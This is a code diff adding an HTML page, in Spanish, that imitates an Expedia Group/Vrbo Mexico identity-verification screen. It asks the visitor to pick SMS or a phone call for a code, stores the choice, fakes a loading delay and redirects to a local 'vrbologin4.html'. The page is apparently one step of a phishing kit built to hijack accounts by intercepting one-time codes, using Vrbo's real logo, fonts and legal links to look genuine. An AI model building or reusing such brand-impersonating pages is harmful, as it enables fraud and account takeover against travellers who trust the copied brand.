@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Confirma tu identidad | Expedia Group</title>
+  
+  <link rel="icon" type="image/png" href="pestaña.png" />
+
+  <style>
+    @font-face {
+      font-family: "Centra No2";
+      font-weight: 400;
+      src: url("https://a.travel-assets.com/egds/fonts/CentraNo2/CentraNo2-Book.woff2") format("woff2");
+    }
+    @font-face {
+      font-family: "Centra No2";
+      font-weight: 500;
+      src: url("https://a.travel-assets.com/egds/fonts/CentraNo2/CentraNo2-Medium.woff2") format("woff2");
+    }
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: "Centra No2", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+      background: #ffffff; color: #191e3b; min-height: 100vh; display: flex; flex-direction: column;
+      justify-content: flex-start; -webkit-font-smoothing: antialiased;
+    }
+    .navbar-container {
+      background: #ffffff; height: 64px; width: 100%; display: flex; justify-content: center;
+      align-items: center; border-bottom: 1px solid #dfe0e4; flex-shrink: 0;
+    }
+    .uitk-header-brand-logo { display: flex; align-items: center; text-decoration: none; }
+    .uitk-header-brand-logo img { height: 36px; display: block; }
+    .page-wrapper { display: flex; justify-content: center; width: 100%; padding: 32px 16px; background: #ffffff; }
+    .card { width: 100%; max-width: 440px; display: flex; flex-direction: column; gap: 24px; }
+    .heading-group { margin-bottom: 0px; display: flex; flex-direction: column; gap: 8px; }
+    h1 { font-size: 24px; font-weight: 500; color: #191e3b; line-height: 1.25; }
+    .subtitle { font-size: 16px; color: #292929; line-height: 1.5; font-weight: 400; margin-top: 4px; }
+    form { display: flex; flex-direction: column; gap: 16px; }
+    #contactType { display: flex; flex-direction: column; gap: 16px; margin-top: 8px; margin-bottom: 8px; }
+    .CRB__label { display: flex; align-items: center; cursor: pointer; gap: 16px; position: relative; }
+    .CRB__input { position: absolute; opacity: 0; width: 24px; height: 24px; cursor: pointer; z-index: 2; }
+    .CRB__toggle {
+      width: 24px; height: 24px; border: 2px solid #818494; border-radius: 50%; background: #fff;
+      display: inline-flex; align-items: center; justify-content: center; flex-shrink: 0;
+      transition: border-color 0.2s ease; position: relative;
+    }
+    .CRB__input:checked + .CRB__toggle { border-color: #1668e3; }
+    .CRB__toggle::after {
+      content: ""; position: absolute; width: 12px; height: 12px; background-color: #1668e3;
+      border-radius: 50%; transform: scale(0); transition: transform 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+    .CRB__input:checked + .CRB__toggle::after { transform: scale(1); }
+    .label-text { font-size: 16px; color: #191e3b; line-height: 1.25; user-select: none; }
+    .text-muted .label-text { color: #676a7d; }
+    .CRB__input:checked ~ .label-text { color: #191e3b; }
+    .btn-wrap { display: flex; flex-direction: column; gap: 12px; margin-top: 8px; }
+    .btn { display: flex; align-items: center; justify-content: center; width: 100%; height: 48px; border-radius: 9999px; font-family: inherit; font-size: 16px; font-weight: 500; cursor: pointer; border: 1px solid transparent; transition: background 0.15s, color 0.15s, opacity 0.15s; }
+    .btn-primary { background-color: #1668e3; color: #ffffff; }
+    .btn-primary:disabled { opacity: 0.36; cursor: not-allowed; }
+    .legal { font-size: 12px; color: #191e3b; line-height: 1.5; text-align: center; margin-top: 8px; }
+    .legal p { margin-bottom: 8px; color: #676a7d; }
+    .legal a { color: #1668e3; text-decoration: underline; }
+    @keyframes inner-circle { 0% { transform: rotate(0deg); } to { transform: rotate(1turn); } }
+    .uitk-loader-page {
+      aspect-ratio: 1/1; background-color: #fff; box-shadow: 0 6px 36px rgba(12, 14, 28, 0.12); 
+      inline-size: 48px; inset-block-end: 0; inset-inline-start: 50%; opacity: 0; padding: 6px; 
+      position: fixed; transform: translate(-50%, 100%); transition: transform .06s cubic-bezier(.4,0,1,1), opacity 0s .12s;
+      z-index: 1000; border-radius: 50%;
+    }
+    .uitk-loader-page.is-visible { opacity: 1; transform: translate(-50%, -40px); transition: transform .12s cubic-bezier(0,0,.2,1); }
+    .uitk-loader { border-radius: 50%; display: inline-block; }
+    .uitk-loader::before {
+      animation: inner-circle .8s linear infinite; aspect-ratio: 1/1; border-bottom-color: #1668e3;
+      border-top-color: rgba(22,104,227,.28); border-left-color: rgba(22,104,227,.28); border-right-color: rgba(22,104,227,.28);
+      border-radius: 50%; border-style: solid; border-width: 6px; content: ""; display: block; inline-size: 36px; 
+    }
+    .is-visually-hidden { display: none; }
+  </style>
+</head>
+<body>
+<div class="navbar-container">
+  <a class="uitk-header-brand-logo" href="#"><img src="https://www.vrbo.com/_dms/header/logo.svg" alt="Expedia Group"></a>
+</div>
+<div class="page-wrapper">
+  <div class="card">
+    <div class="heading-group">
+      <h1>Confirma tu identidad</h1>
+      <p class="subtitle">Para proteger tu cuenta, te enviaremos un código de verificación a tu teléfono para confirmar tu identidad. Pueden aplicar cargos de tu compañía telefónica.</p>
+    </div>
+    <form id="identity-form">
+      <div id="contactType" aria-label="hello" role="radiogroup">
+        <div class="form-group CRB CRB--radio">
+          <label class="CRB__label text-muted">
+            <input type="radio" class="CRB__input" name="contactType" value="SMS">
+            <span class="CRB__toggle"></span><span class="label-text">Recibir mensaje de texto (SMS)</span>
+          </label>
+        </div>
+        <div class="form-group CRB CRB--radio">
+          <label class="CRB__label text-muted">
+            <input type="radio" class="CRB__input" name="contactType" value="CALL">
+            <span class="CRB__toggle"></span><span class="label-text">Recibir una llamada telefónica</span>
+          </label>
+        </div>
+      </div>
+      <div class="btn-wrap"><button type="submit" class="btn btn-primary" id="contactNext" disabled>Continuar</button></div>
+    </form>
+    <div class="legal">
+      <p>Al continuar, declaras que leíste y aceptas<br>nuestros <a href="https://www.vrbo.com/legal/terms-and-conditions" target="_blank">Términos y condiciones</a> y <a href="https://www.vrbo.com/legal/privacy-policy" target="_blank">Aviso de privacidad</a>.</p>
+      <p>©2026 Vrbo México. Todos los derechos reservados.</p>
+    </div>
+  </div>
+</div>
+<span class="uitk-loader uitk-loader-page" id="page-loader"><span class="is-visually-hidden"></span></span>
+<script>
+  const identityForm = document.getElementById('identity-form');
+  const btnContinuar = document.getElementById('contactNext');
+  const loader = document.getElementById('page-loader');
+  document.querySelectorAll('.CRB__input').forEach(radio => {
+    radio.addEventListener('change', () => { btnContinuar.disabled = false; });
+  });
+  // Reemplaza el submit del identity-form
+identityForm.addEventListener('submit', (e) => {
+  e.preventDefault();
+  btnContinuar.disabled = true;
+  loader.classList.add('is-visible');
+  const lada = document.querySelector('.CRB__input:checked').value; // "SMS" o "CALL"
+  sessionStorage.setItem('vrbo_lada', lada); // ← opción = "lada"
+  setTimeout(() => { window.location.href = 'vrbologin4.html'; }, 3000);
+});
+</script>
+</body>
+</html>
